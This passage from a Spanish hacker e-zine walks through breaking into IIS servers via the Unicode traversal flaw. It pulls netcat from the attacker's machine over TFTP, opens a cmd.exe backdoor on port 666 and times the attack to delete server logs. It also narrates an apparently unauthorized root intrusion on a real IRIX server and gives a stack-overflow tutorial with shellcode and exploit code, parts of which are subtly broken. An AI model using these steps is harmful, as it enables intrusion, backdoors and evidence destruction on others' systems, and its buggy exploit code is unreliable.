http://www.microsoft.com/technet/security/bulletin/MS00-078.asp 
 
Microsoft IIS 4.0 / 5.0 Extended UNICODE Directory Traversal Vulnerability 
http://www.securityfocus.com/vdb/?id=1806 
 
 
Antonio Ropero 
antonior@hispasec.com 
 
 
-------------------------------------------------------------------- 
(c) Hispasec, 2000 www.hispasec.com/copyright.asp  
-------------------------------------------------------------------- 
 
---------------------------------------------------------------------- 
 
Ahora como podemos explotar esta falla... 
 
La verdad es que esta tecnica la he ido evolucionando de a poco, primero 
con mi exploit solo podia hacer dir y pasearme, luego con una comentario 
de CeroAbsoluto se me comenzo a prender la ampolleta y luego con una  
ayudita de ZeroX termine de caer en como explotarlo, la tecnica que  
resulto de esta evolucion fue: 
 
./iis www.alco.com 
Exploit escrito por z0rbas ... 
... 
... 
WinNtShell ]$ dir 
Lista de archivos 
... 
... 
WinNtShell ]$ 
 
Ahora comienza el hack propiamente tal, tomamos alguien con win o con  
linux, da lo mismo, si estas en win, corres el tftpd32.zip de la web y 
si estas en linux, activas el servicio de tftp (OjO, no es lo mismo que 
ftp). Dentro de la carpeta donde estan los archivos que pueden bajar de 
tu pc pones el netcat (tambien lo puedes bajar en nuestra web) activas 
el tftpd y ejecutas esto en iis 
 
WinNtShell ]$ tftp -i [TU_IP] GET nc.exe picapoto.exe 
 
Si tienes permiso de escritura, al hacer dir de nuevo, te aparecera el 
famoso picapoto.exe , ahora viene la parte final para por fin poder  
entrar: 
 
WinNtShell ]$ picapoto -l -p 666 -e cmd.exe 
 
Esto se queda pegado, asi que no creas que se colgo el exploit, no lo  
toques y dejalo, abre el telnet y haz telnet al puerto 666, ahora estas  
frente a una shell de DOS comun y corriente, suerte. 
Por si acaso, no tienes permisos de admin, por lo que no puedes borrar  
el log de esa fecha, asique yo te recomendaria que hasta aqui llegaras a  
las 11:50 de la hora del servidor para que a las 12 ya puedas borrar el  
log anterior, ya que el log del iis queda asi: 
 
C:\WINNT\system32\LogFiles\W3SVC1>dir 
 El volumen de la unidad C es WIN2000 
 El número de serie del volumen es: 040A-44F6 
 
 Directorio de C:\WINNT\system32\LogFiles\W3SVC1 
 
07-03-2001  19:58       <DIR>          . 
07-03-2001  19:58       <DIR>          .. 
08-03-2001  23:06                   21 ex010308.log 
09-03-2001  00:37               76.961 ex010309.log 
               2 archivos         76.982 bytes 
               2 dirs     858.095.616 bytes libres 
 
C:\WINNT\system32\LogFiles\W3SVC1>more ex010309.log 
#Software: Microsoft Internet Information Services 5.0 
#Version: 1.0 
#Date: 2001-03-09 00:04:37 
#Fields: time c-ip cs-method cs-uri-stem sc-status  
00:04:37 200.61.40.80 GET /n0nexi5tent_fi1e.html 404 
00:04:42 200.61.40.80 GET /index.html 200 
00:04:46 200.61.40.80 GET /etc/group 404 
00:04:49 200.61.40.80 GET /boot.ini 404 
00:04:58 200.61.40.80 GET /etc/group 404 
00:05:01 200.61.40.80 GET /boot.ini 404 
00:05:04 200.61.40.80 GET /cgi-bin/webdist.cgi 404 
00:05:13 200.61.40.80 GET /cgi-bin/campas 404 
00:05:16 200.61.40.80 GET /cgi-bin/htmlscript 404 
00:05:20 200.61.40.80 GET /cgi-bin/php.cgi 404 
00:05:23 200.61.40.80 GET /cgi-bin/pfdispaly 404 
00:05:26 200.61.40.80 GET /cgi-bin/pfdispaly.cgi 404 
00:05:29 200.61.40.80 GET /cgi-bin/view-source 404 
00:05:31 200.61.40.80 GET /cgi-bin/htsearch 404 
00:05:37 200.61.40.80 GET /cgi-bin/infosrch.cgi 404 
00:05:40 200.61.40.80 GET /cgi-bin/faxsurvey 404 
00:05:44 200.61.40.80 GET /cgi-bin/counterfiglet/nc/f=;cat+/etc/group 404 
00:05:47 200.61.40.80 GET /cgi-bin/calendar_admin.pl 404 
00:05:50 200.61.40.80 GET /cgi-bin/calendar/calendar_admin.pl 404 
00:05:53 200.61.40.80 GET /cgi-bin/pollit/Poll_It_SSI_v2.0.cgi 404 
00:05:56 200.61.40.80 GET /cgi-bin/bb-hostsvc.sh 404 
00:05:59 200.61.40.80 GET /cgi-bin/netauth.cgi 404 
00:22:53 200.61.40.80 GET /cgi-bin/phf 404 
00:22:56 200.61.40.80 GET /cgi-bin/php.cgi 404 
00:23:01 200.31.59.141 GET /index.html 304 
00:23:06 200.61.40.80 GET /cgi-bin/Count.cgi 404 
00:23:09 200.61.40.80 GET /cgi-bin/test-cgi 404 
00:23:12 200.61.40.80 GET /cgi-bin/unlg1.1 404 
00:23:15 200.61.40.80 GET /cgi-bin/nph-test-cgi 404 
00:23:18 200.61.40.80 GET /cgi-bin/handler 404 
00:23:26 200.61.40.80 GET /cgi-bin/webgais 404 
00:23:29 200.61.40.80 GET /cgi-bin/websendmail 404 
00:23:32 200.61.40.80 GET /cgi-bin/webdist.cgi 404 
00:23:41 200.61.40.80 GET /cgi-bin/faxsurvey 404 
00:23:44 200.61.40.80 GET /cgi-bin/htmlscript 404 
00:23:48 200.61.40.80 GET /cgi-bin/pfdispaly.cgi 404 
00:23:51 200.61.40.80 GET /cgi-bin/perl.exe 404 
00:23:59 200.61.40.80 GET /cgi-bin/wwwboard.pl 404 
00:24:35 200.31.59.141 GET /index.html 304 
00:27:19 200.27.2.83 GET /index.html 200 
00:27:27 200.31.59.141 GET /index.html 304 
00:29:16 200.31.59.141 GET /index.html 304 
00:30:16 164.77.112.31 GET /index.html 200 
00:32:19 200.28.96.104 GET /index.html 200 
00:34:26 200.31.58.10 GET /index.html 200 
00:35:19 200.31.59.141 GET /index.html 304 
00:35:28 200.28.96.104 GET /favicon.ico 404 
00:35:32 200.28.96.104 GET /favicon.ico 404 
00:42:43 200.31.58.10 GET /scripts/../../winnt/system32/cmd.exe 502 
00:43:29 200.31.59.141 GET /index.html 304 
00:43:34 200.31.58.10 GET /scripts/../../winnt/system32/cmd.exe 502 
00:43:43 200.31.58.10 GET /sanot2.htm 404 
00:44:55 200.31.59.141 GET /default.asp 404 
00:45:48 200.31.59.141 GET /default.asp 404 
00:46:24 200.31.59.141 GET /global.asa::$DATA 404 
00:46:31 200.31.59.141 GET /global.asa::DATA$ 404 
00:47:08 200.31.59.141 GET /index.html 304 
00:48:21 200.31.58.10 GET /scripts/../../winnt/system32/cmd.exe 502 
00:48:52 200.31.59.141 GET /index.html 304 
00:50:57 200.31.58.10 GET /scripts/../../winnt/system32/cmd.exe 502 
00:51:13 200.31.58.10 GET /scripts/../../winnt/system32/cmd.exe 502 
00:55:31 200.31.59.141 GET /index.html 304 
00:55:59 200.29.11.111 GET /index.html 200 
#Software: Microsoft Internet Information Services 5.0 
#Version: 1.0 
#Date: 2001-03-09 00:59:10 
#Fields: time c-ip cs-method cs-uri-stem sc-status  
01:00:34 200.31.58.10 GET /scripts/../../winnt/system32/cmd.exe 200 
01:01:45 200.31.58.10 GET /scripts/../../winnt/system32/cmd.exe 502 
01:01:49 200.31.58.10 GET /scripts/../../winnt/system32/cmd.exe 200 
01:01:58 200.31.58.10 GET /scripts/../../winnt/system32/cmd.exe 502 
01:04:54 200.31.58.10 GET /scripts/../../winnt/system32/cmd.exe 502 
01:07:29 200.31.58.10 GET /scripts/../../winnt/system32/cmd.exe 502 
01:07:31 200.28.195.221 GET /scripts/../../winnt/system32/cmd.exe 200 
01:07:49 200.28.195.221 GET /scripts/../../winnt/system32/cmd.exe 200 
01:09:00 200.31.58.10 GET /scripts/../../winnt/system32/cmd.exe 502 
01:09:14 200.31.58.10 GET /scripts/../../winnt/system32/cmd.exe 502 
01:10:03 200.31.58.10 GET /scripts/../../winnt/system32/cmd.exe 502 
01:10:39 200.31.58.10 GET /scripts/../../winnt/system32/cmd.exe 502 
01:10:57 200.28.195.221 GET /scripts/../../winnt/system32/cmd.exe 502 
01:11:06 200.31.58.10 GET /scripts/../../winnt/system32/cmd.exe 502 
01:12:56 200.31.59.141 GET /index.html 200 
01:13:01 200.28.195.221 GET /scripts/../../winnt/system32/cmd.exe 502 
01:13:41 200.31.59.141 GET /index.html 304 
01:13:44 200.31.59.141 GET /index.html 304 
01:14:38 200.31.58.10 GET /hackeada.html 404 
01:14:40 200.31.59.141 GET /index.html 200 
01:15:13 200.28.195.221 GET /scripts/../../winnt/system32/cmd.exe 502 
01:15:15 200.31.59.141 GET /index.html 200 
01:16:11 200.31.59.141 GET /index.html 200 
01:16:44 200.31.59.141 GET /index.html 304 
01:17:12 200.31.59.141 GET /index.html 304 
01:19:56 200.31.59.141 GET /index.html 304 
01:22:29 200.31.59.141 GET /index.html 304 
01:22:48 64.76.16.54 GET /index.html 200 
01:23:03 200.31.58.10 GET /index.html 200 
01:23:47 64.76.19.58 GET /cgi-bin/phf 404 
01:23:50 64.76.19.58 GET /cgi-bin/php.cgi 404 
01:23:55 64.76.19.58 GET /cgi-bin/Count.cgi 404 
01:23:58 64.76.19.58 GET /cgi-bin/test-cgi 404 
01:24:00 64.76.19.58 GET /cgi-bin/unlg1.1 404 
01:24:03 64.76.19.58 GET /cgi-bin/nph-test-cgi 404 
01:24:05 64.76.19.58 GET /cgi-bin/handler 404 
01:24:17 64.76.19.58 GET /cgi-bin/webgais 404 
01:24:20 64.76.19.58 GET /cgi-bin/websendmail 404 
01:24:31 64.76.19.58 GET /cgi-bin/webdist.cgi 404 
01:24:38 64.76.19.58 GET /cgi-bin/faxsurvey 404 
01:24:46 64.76.19.58 GET /cgi-bin/htmlscript 404 
01:24:48 64.76.19.58 GET /cgi-bin/pfdispaly.cgi 404 
01:24:51 64.76.19.58 GET /cgi-bin/perl.exe 404 
01:24:53 64.76.19.58 GET /cgi-bin/wwwboard.pl 404 
01:24:56 200.31.59.141 GET /index.html 304 
01:24:57 200.31.59.141 GET /index.html 304 
01:24:57 200.31.59.141 GET /index.html 304 
01:24:59 200.31.59.141 GET /index.html 304 
01:25:01 64.76.19.58 GET /cgi-bin/www-sql 404 
01:25:03 64.76.19.58 GET /cgi-bin/view-source 404 
01:25:10 64.76.19.58 GET /cgi-bin/campas 404 
01:25:13 64.76.19.58 GET /cgi-bin/aglimpse 404 
01:25:14 200.31.59.141 GET /index.html 304 
01:25:15 64.76.19.58 GET /cgi-bin/man.sh 404 
01:25:15 200.31.59.141 GET /index.html 304 
01:25:18 64.76.19.58 GET /cgi-bin/AT-admin.cgi 404 
01:25:21 64.76.19.58 GET /cgi-bin/filemail.pl 404 
01:25:28 64.76.19.58 GET /cgi-bin/fexplore.exe 404 
01:25:31 64.76.19.58 GET /cgi-bin/maillist.pl 404 
01:25:33 64.76.19.58 GET /cgi-bin/jj 404 
01:25:42 64.76.19.58 GET /cgi-bin/info2www 404 
01:25:47 64.76.19.58 GET /cgi-bin/files.pl 404 
01:26:00 64.76.19.58 GET /cgi-bin/finger 404 
01:26:07 64.76.19.58 GET /cgi-bin/bnbform.cgi 404 
01:26:10 64.76.19.58 GET /cgi-bin/survey.cgi 404 
01:26:26 64.76.19.58 GET /cgi-bin/AnyForm2 404 
01:26:29 64.76.19.58 GET /cgi-bin/Textcounter.pl 404 
01:26:31 64.76.19.58 GET /cgi-bin/classifieds.cgi 404 
01:26:34 64.76.19.58 GET /cgi-bin/environ.cgi 404 
01:26:36 64.76.19.58 GET /cgi-bin/whois_raw.cgi 404 
01:26:39 64.76.19.58 GET /vti_pvt/service.pwd 404 
01:26:41 200.31.59.141 GET /index.html 304 
01:26:42 64.76.19.58 GET /vti_pvt/users.pwd 404 
01:26:44 64.76.19.58 GET /vti_pvt/authors.pwd 404 
01:26:50 64.76.19.58 GET /vti_pvt/administrators.pwd 404 
01:26:57 64.76.19.58 GET /cgi-dos/args.bat 404 
01:26:59 64.76.19.58 GET /cgi-win/uploader.exe 404 
01:27:01 64.76.19.58 GET /search97.vts 404 
01:27:01 200.28.195.221 GET /index.html 200 
01:27:06 200.31.59.141 GET /index.html 304 
01:27:06 200.31.59.141 GET /index.html 304 
01:27:09 64.76.19.58 GET /carbo.dll 404 
01:27:09 200.28.195.221 GET /imagenes/sam 404 
01:27:17 64.76.19.58 GET /cgi-bin/phf 404 
01:27:19 64.76.19.58 GET /cgi-bin/php.cgi 404 
01:27:19 200.31.59.141 GET /index.html 304 
01:27:33 200.28.195.221 GET /web/imagenes/sam 404 
01:27:33 64.76.19.58 GET /cgi-bin/test.cgi 404 
01:27:36 64.76.19.58 GET /cgi-bin/webdist.cgi 404 
01:27:44 64.76.19.58 GET /cgi-bin/htmlscript 404 
01:27:53 64.76.19.58 GET /cfdocs/expeval/openfile.cfm 404 
01:27:56 64.76.19.58 GET /cgi-bin/rwwwshell.pl 404 
01:27:58 64.76.19.58 GET /cgi-bin/nph-publish 404 
01:28:01 64.76.19.58 GET /cgi-bin/perl 404 
01:28:04 64.76.19.58 GET /cgi-bin/glimpse 404 
01:28:07 200.28.195.221 GET /imagenes/sam 404 
01:28:11 64.76.19.58 GET /cgi-bin/wrap 404 
01:28:14 64.76.19.58 GET /cgi-bin/cgiwrap 404 
01:28:22 64.76.19.58 GET /cgi-bin/guestbook.cgi 404 
01:28:25 64.76.19.58 GET /cgi-bin/edit.pl 404 
01:28:27 64.76.19.58 GET /cgi-bin/perlshop.cgi 404 
01:28:30 64.76.19.58 GET /_vti_inf.html 404 
01:28:32 64.76.19.58 GET /_vti_pvt/service.pwd 404 
01:28:39 64.76.19.58 GET /_vti_pvt/users.pwd 404 
01:28:42 64.76.19.58 GET /_vti_pvt/authors.pwd 404 
01:28:45 64.76.19.58 GET /_vti_pvt/administrators.pwd 404 
01:28:47 64.76.19.58 GET /_vti_bin/shtml.dll 404 
01:28:50 64.76.19.58 GET /_vti_bin/shtml.exe 404 
01:28:57 200.28.195.221 GET /imagenes/team.gif 404 
01:29:02 64.76.19.58 GET /cgi-bin/rguest.exe 404 
01:29:17 200.47.86.38 GET /index.html 200 
01:29:18 64.76.19.58 GET /cgi-bin/wguest.exe 404 
01:29:31 64.76.19.58 GET /scripts/CGImail.exe 404 
01:29:45 64.76.19.58 GET /scripts/tools/newdsn.exe 404 
01:29:53 64.76.19.58 GET /scripts/fpcount.exe 404 
01:30:00 64.76.19.58 GET /cfdocs/expelvel/openfile.cfm 404 
01:30:03 64.76.19.58 GET /cfdocs/expelval/exprcalc.cfm 404 
01:30:06 64.76.19.58 GET /cfdocs/expelval/displayopenedfile.cfm 404 
01:30:11 64.76.19.58 GET /iissamples/exair/howitworks/codebrws.asp 404 
01:30:21 64.76.19.58 GET /msads/Samples/SELECTOR/showcode.asp 404 
01:30:26 200.31.59.141 GET /index.html 304 
01:30:33 200.31.59.141 GET /index.html 304 
01:31:45 200.31.59.141 GET /index.html 304 
01:31:45 200.31.59.141 GET /index.html 304 
01:32:03 200.28.195.221 GET /scripts/../../winnt/system32/cmd.exe 502 
01:32:09 200.31.59.141 GET /index.html 304 
01:32:11 200.31.59.141 GET /index.html 304 
01:33:01 200.31.58.10 GET /scripts/../../winnt/system32/cmd.exe 502 
01:33:11 200.31.58.10 GET /index.html 200 
01:34:33 200.31.59.141 GET /index.html 200 
01:34:33 64.76.155.2 GET /scripts/../../winnt/system32/cmd.exe 200 
01:35:09 64.76.155.2 GET /scripts/../../winnt/system32/cmd.exe 502 
01:35:21 200.28.195.221 GET /zerox.htm 404 
01:35:41 64.76.155.2 GET /scripts/../../winnt/system32/cmd.exe 502 
01:35:58 200.28.195.221 HEAD /index.html 200 
01:36:00 200.28.195.221 GET /index.html 200 
01:36:07 64.76.155.2 GET /scripts/../../winnt/system32/cmd.exe 500 
01:36:07 64.76.155.2 GET /scripts/../../winnt/system32/cmd.exe 500 
01:36:07 64.76.155.2 GET /scripts/../../winnt/system32/cmd.exe 500 
01:36:08 64.76.155.2 GET /scripts/../../winnt/system32/cmd.exe 500 
 
... 
Esto es un pedazo de mi logfile, parece que alguien me anduvo escaniando 
La linea: 
 
01:34:33 64.76.155.2 GET /scripts/../../winnt/system32/cmd.exe 200 
 
Demuestra que alguien ejecuto un comando, como lo se, porque apunta a  
cmd.exe y tiene el codigo de respuesta 200 que equivale a OK. A parte  
de eso no se logea mas, que alguien me corrija si me equivoco. 
Si no tienes permiso de escritura en el directorio por donde ejecutas 
el cmd.exe puedes probar subirlo en C:\winnt\temp . 
 
 
Y aprovechando, otro root mas... 
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= 
 
IRIX. 
----- 
 
 
Bueno esto fue un hack en conjunto, yo aqui voi a contar como fue que yo  
personalmente obtuve root. 
 
La  verdad es que yo encontre este server porque no conocia los sistemas  
irix, asi que queria averiguar como eran los logs y todo eso para cachar  
un poquito, la  verdad es que  estuve buscando  manuales y todo, pero no  
encontre nada...asi que me puse a buscar un irix  y asi  llegue  a  este  
servidor. 
 
Lo  primero que  hice cuando lo encontre fue  hacerle telnet,luego probe  
por  corazonada  el login  "guest" y  ni siquiera me  pidio  password(se  
acuerdan la falla  que corregia  en mi texto de  passwords??) bueno para  
mas remate el passwd no estaba  shadowed, por lo  que veia los passwords  
encriptados, lo que  no me ayudo  mucho, porque  estaban bien  elegidos,  
tuve el john dos  dias corriendo y  nada, asi que  como ademas no  habia  
compilador no  podia subirle  un exploit  local(  no  encontre  en bash)  
asi que me quedaba  una opcion,  una falla del  mismo demonio de  telnet  
para irix, asi  que manos a la obra, entre como guest y ejecute uname -a  
para irme a la segura,  era un IRIX 6.2. Me fui  a buscar el exploit, lo  
compile y me tire... 
 
[ little@.... ]$ ./telnetd xxxx.com.xx -v 62 
copyright LAST STAGE OF DELIRIUM jul 2000 poland  //lsd-pl.net/ 
telnetd for irix 6.2 6.3 6.4 6.5 6.5.8 IP:all 
 
...... 
 
IRIX 6.2 ... 
< ahora estoi en una shell, pero que no me muestra el prompt > 
id 
UID=0(root) GID=0(sys) 
< hermoso no? > 
aqui ya me fui y nos fuimos. 
bueno ahi sabran los que hicimos despues, los logs... 
Para los que no conozcan los sistemas irix, yo  encontre  los  logs  en 
/var/adm/ 
puede que en este caso haya sido una excepcion, pero viendo como estaba  
la seguridad  en el sistema asi  debe ser  la instalacion  por defecto. 
Ademas el resto estaba linkado en /etc/  asi que fue incluso mas  facil  
pillarlos.  No  voi a  seguir  poniendo, ya  que  algo  les  queda  por  
experimentar a  ustedes,  los  que  siguen  son  todos  hacks  remotos. 
Tambien esta  es la unica  edicion  donde voi  a poner  la  seccion  de  
exploits  de  esta forma,  a partir  del proximo  seguimos con  nuestro  
estilo. 
 
Para los que todavia estan dedicados a hackear 100%, me gustaria darles  
un consejo,  la verdad es  que en un principio,  hackear es lo  maximo,  
pero luego con el tiempo te vas dando cuenta que hay hacks que no valen 
la pena, para que entrar en todas las partes que puedas, solo  entra en  
las que no pudiste,  eso es  un reto y no hackees  si  no sabes  lo que  
haces no dañes nada y sobre cambiar las webs, ten respeto,  puede que a 
veces sea justificado, pero mi  opinion es que es mucho   mas de hacker 
avisar al administrador del sistema que tiene una falla. Ademas  que la 
mejor manera de demostrar lo que sabes es escribiendo,  ayudando gente, 
creando cosas, no destruyendolas, no necesitas hackear una web para ser 
respetado, demuestra que sabes haciendo otra cosa. Un ejemplo  es Linus 
Torvalds, el no hackio nada  para ser admirado, pero creo algo digno de 
admiracion, yo personalmente admiro mucho mas a Linus Torvalds que a un  
tipo que se hackea la nasa. 
 
 
Saludos  
z0rbas





====================================================================== 
= 0x0B =============================================================== 
====================================================================== 
====================================================================== 


			Stack Ovreflow Exploits 
			''''''''''''''''''''''' 
 
 
Este texto tratare de explicar lo mas claramente posible como crear nuestros 
propios exploits  de  desbordamiento de la pila,  al principio esto te puede  
parecer un poco confuso, pero la verdad es que luego de darle vuelta un poco 
al tema te daras cuenta de que es muy facil. 
 
Si tienes  conocimientos basicos  de ensamblador te sera muy facil  entender 
todo, si  no los tienes, no te  preocupes que no me  saltare la  explicacion 
estandar  de la pila y otros con  las que empiezan todos los textos  de este 
tema. 
 
Este texto esta exclusivamente orientado a la familia de procesadores 80x86. 
 
 
1) Un Programa. 
 
Todo programa ejecutable, .exe o .com o cualquiera de ese estilo(en linux no 
hay .algo ;) ) tiene ciertas caracteristicas y se divide en segmentos. Los  
segmentos principales de un programa son: 
 
CS (Code Segment) 
''''''''''''''''' 
Este  es el segmento  de memoria donde se  almacenan las  instrucciones  que  
seran ejecutadas, pero  esto no es el  programa, ya  que aqui no  se guardan 
datos ni variables, o por lo menos no es usual. 
 
DS (Date Segment) 
''''''''''''''''' 
Este  es el segmento donde se almacenan los datos, como variables y ese tipo 
de cosas. 
 
SS (Stack Segment) 
'''''''''''''''''' 
Aqui llegamos al mas importante en este texto, el Stack. 
 
Cuando  un programa debe  almacenar informacion  para intercambio  rapido o 
para  pasar argumentos  a una funcion  utiliza el stack,  nosotros solo  lo  
analizaremos en el caso de las funciones. 
 
Cuando  llamamos a una funcion los argumentos se  pasan en el Stack, y esto 
se hace de la siguiente manera: 
 
llamada a la funcion en C: 
funcion(arg1,arg2,agr3); 
 
+ o - lo mismo en ASM: 
PUSH arg3 
PUSH arg2 
PUSH arg1 
call funcion 
 
PUSH  en assembler  es decir mete en  la pila tal cosa, todos  los datos se  
pasan en orden inverso, esto  es debido a que la  pila podriamos  comparala 
con una pila de platos, donde  cada vez que pones  un plato queda  sobre el 
otro y  es necesario  sacarlo para poder  sacar el que  teniamos antes,  me 
explico,  si tengo el plato  A y el B, si  hago push A, pongo A en la pila, 
si  luego hago  push B, el  plato B queda sobre  A y para sacar  A necesito 
hacer pop B antes(o sea, sacar B antes). Con los datos es igual. 
 
 
 
 
Ahora que pasa realmente cuando llamamos a una funcion: 
 
------------Ejemplo para explicar---------------------- 
char funcion() 
{ 
} 
 
main() 
{ 
char variable[5]; 
funcion(variable[1]); 
} 
------------------------------------------------------- 
 
Memoria: 
...variable [ 8 bytes ] -- SP [4 bytes] -- RET [4 bytes] -- arg [4 bytes]... 
 
SP (Stack Pointer) 
Este es un puntero a la posicion actual de la pila. 
RET 
Este es un puntero a la posicion donde se debe retornar luego de ejecutar 
la funcion, y exactamente este es nuestro objetivo, queremos cambiar esta 
direccion para asi poder ejecutar codigo que nos de algo util, como podria 
ser una shell de r00t ;) 
 
Como explotarlo: 
 
Tomemos el ejemplo mas clasico,  
----------------------------------------- 
#include<string.h> 
 
int main(int argc,char *argv[]) 
{ 
  char buffer[1024]; 
  if (argc > 1)  
  {  
    strcpy(buffer,argv[1]);  
  } 
} 
----------------------------------------- 
 
Ahora este programa a simple vista es vulnerable ya que  recibe un argumento 
y lo copia en la variable buffer, pero no comprueba el  tamaño del argumento. 
Por lo que si pasaramos un argumento mayor a 1024 bytes, (8 bytes mas largos 
minimo) obtendriamos un hermoso "segmentation fault"  lo que nos demostraria 
la vulnerabilidad del programa. Pero un error no nos sirve, nosotros necesi- 
tamos ejecutar  una shell o algo asi,  para conseguir  root o subir nuestros 
privilegios. La  exigencia que  tiene que  estar presente  para que  podamos  
sacar shell de root, es que el programa que vamos a explotar tenga el bit de 
suid activado, para buscarlos, puedes encontrar un script al final del texto 
 
Sigamos con lo principal, como se codea el exploit. 
 
Para codear el exploit necesitamos varias cosas: 
1) Saber el tamaño del buffer a pasar como argumento 
2) Saber el offset(desplazamiento) 
3) Una shellcode 
4) SP actual 
 
1) Tamaño del buffer: no creo que haga falta explicacion de este, es la suma 
                      de todos los bytes de variables a partir de la que vas 
                      a desbordar, mas 8 
 
Ejemplo 
#include <string.h> 
 
void main(int argc, char * argv[]) 
{ 
char buffer[1024]; 
char buffer2[100]; 
if(argc>2) 
  strcpy(buffer,argv[1]); 
} 
 
en este caso la variable a desbordar es buffer, asi que el tamaño del buffer 
que debeos pasar es igual a 1024+100+8. 
 
AVISO: En el stack se pasan de 4 bytes, por lo que si el buffer2 fuera de 99 
bytes, debes pasar un argumento de 1024+100+8 igual. 
 
 
2) Saber el offset: aqui lo ves en la parte practica, pero la verdad es que  
                    no se un metodo mejor que el que pongo ahi,  si alguien  
                    lo sabe, porfavor mandeme un mail. 
 
3) Shellcode: esta es una cadena en hexadecimal que contiene el codigo que 
              queremos ejecutar,  si quieres saber  como  hacer tu  propio  
              shellcode, puedes usar la utilidad que  incluyo al final del 
              texto, pero  no es tan facil, ya  que la  shellcode no puede  
              tener ceros, ya que se tomaria como fin de string, y bye con 
              el desbordamiento. En todo caso el crear una shell  code  no  
              es una tarea facil y ahi si debes saber ensamblador. 
 
4) SP actual: Este es el  puntero a la  direccion actual  del Stack,  para  
              obtenerlo solo usas una funcion, si entiendes  assembler, la 
              vas a entender, si no, no importa, te la explico. 
 
u_long get_sp() 
{ 
 __asm__("movl %esp,%eax");	 
} 
 
/*  
En ensamblador se trabaja con los registros del procesador, en el  
registro que se devuelven los valores de retorno de las funciones es 
en AX y el  registro SP es el puntero al  Stack, en este caso esp es 
SP(32 bits)  y eax(32 bits), ya que sin la  e solo serian 16 bits. Y  
lo que hace  la  funcion  es  pedirle al  compilador que ejecute esa  
linea en ensamblador, que lo que hace  es copiar el valor  de ESP en  
EAX y  al  salir de la  funcion,  se toma EAX  como el retorno de la  
funcion, o sea, retorna el valor del puntero al Stack                */ 
 
 
Ya tenemos lo elemental, en este texto usare la misma shellcode del texto 
que escribio Ytrium sobre los Stack Overflows,  pero si quieres  utilizar  
otra, puedes encontrar muchas en www.hack.co.za , y su uso es igual, a lo 
mas puede que cambie el offset. 
 
 
 char shell[]=  
      "\xeb\x18\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\x89\xf3"  
      "\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\xe8\xe3\xff\xff\xff\x2f"  
      "\x62\x69\x6e\x2f\x73\x68";  
 
 
Comprobemosla: 
 
........................................................................ 
 
main() 
{ 
  char shell[]= 
       "\xeb\x18\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\x89\xf3" 
       "\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\xe8\xe3\xff\xff\xff\x2f" 
       "\x62\x69\x6e\x2f\x73\x68"; 
void (* func)()=(void *) shell; 
  
func(); 
}                            
......................................................................... 
 
Funciona: 
bash-2.03# pico shell.c 
bash-2.03# gcc -o shell shell.c 
bash-2.03# ./shell 
sh-2.03#  
 
Ya tenemos la shell, ahora vamos a ver que tal nos va con el exploit... 
 
 
EL programa a explotar es el siguiente: 
 
 
#include<string.h>  
  
int main(int argc,char *argv[])  
{  
  char buffer[512];  
  if (argc > 1)   
  {   
    strcpy(buffer,argv[1]);   
  }  
}  
 
 
Exploit: 
Solo lo escribire, luego lo explico intruccion por instruccion. 
 
#include <stdlib.h> 
 
  char shell[]= 
       "\xeb\x18\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\x89\xf3" 
       "\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\xe8\xe3\xff\xff\xff\x2f" 
       "\x62\x69\x6e\x2f\x73\x68"; 
 
#define D_OFFSET 0 
#define D_SIZE  612 
 
unsigned long get_sp(void) { 
   __asm__("movl %esp,%eax"); 
} 
 
 
void main() { 
  char buffer[D_SIZE],*ptr_buffer; 
  long addr; 
  int offset= D_OFFSET 
  int bsize= D_SIZE; 
  int i; 
 
  addr = get_sp() - offset; 
 
  for (i = 0; i < bsize; i++) 
    *(ptr_buffer) = 0; 
 
  printf("Usando la direccion: 0x%x\n", addr); 
 
  ptr_buffer = buffer; 
 
  for (i = 0; i < bsize; i+=4) 
    *(ptr_buffer+4) = addr; 
 
  for (i = 0; i < bsize/2; i++) 
    buffer[i] = 0x90; 
 
  ptr_buffer = buffer + ((bsize/2) - (strlen(shell)/2)); 
 
  for (i = 0; i < strlen(shell); i++) 
    *(ptr_buffer++) = shell[i]; 
 
  buffer[bsize - 1] = 0; 
 
  execl("./vulnerable", "vulnerable", buffer, 0); 
 
} 
 
 
 
Este programa debiese explotar el programa vulnerable, pero antes habria que 
jugar un poco con el offset y el bsize, pero como sabemos que es verdad que 
podemos modificar el RET, facil hagamos esto: 
 
void main() { 
  char buffer[1000]; 
  int x; 
  for(x=0;x<1000;x++) 
      buffer[x]='A'; 
  buffer[1000]=0; 
  execl("./vulnerable","vulnerable",buffer,0); 
} 
 
Al ejecutar esto nos dara un core dumped, ejecuta "gdb ./vulnerable core" 
y te mostrara donde se produjo el error, te dira que se produjo al no  
encontrar la direccion 0x41414141 eso es porque el valor de A en hexadeci- 
mal es 0x41...ahi puedes ver que modificaste el valor de RET, ya que trato 
de retornar a la direccion que tu le pasastes. 
 
Analizemos el programa: 
 
#include <stdlib.h> 
 
  char shell[]= 
       "\xeb\x18\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\x89\xf3" 
       "\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\xe8\xe3\xff\xff\xff\x2f" 
       "\x62\x69\x6e\x2f\x73\x68"; 
 
#define D_OFFSET 0 
#define D_SIZE  612 
 
unsigned long get_sp(void) { 
   __asm__("movl %esp,%eax"); 
} 
 
Es la shellcode, la funcion get_sp y definicmos el oofset y el tamaño del  
buffer del exploit. Mas los includes. 
 
 
void main() { 
  char buffer[D_SIZE],*ptr_buffer; 
  long addr; 
  int offset= D_OFFSET 
  int bsize= D_SIZE; 
  int i; 
 
 
Aqui comenzamos el programa y definimos las variables. 
 
  addr = get_sp() - offset; 
 
  printf("Usando la direccion: 0x%x\n", addr); 
 
La direccion a la que queremos saltar es igual a la posicion actual de 
la pila menos el offset. 
 
  ptr_buffer = buffer; 
 
 
  for (i = 0; i < bsize; i++) 
    *(ptr_buffer) = 0; 
 
 
que ptr_buffer apunte a buffer y dejamos a buffer entero a cero. 
 
  for (i = 0; i < bsize; i+=4) 
    *(ptr_buffer+4) = addr; 
 
cada 0 bytes ponemos addr en nuestro buffer. 
 
  for (i = 0; i < bsize/2; i++) 
    buffer[i] = 0x90; 
 
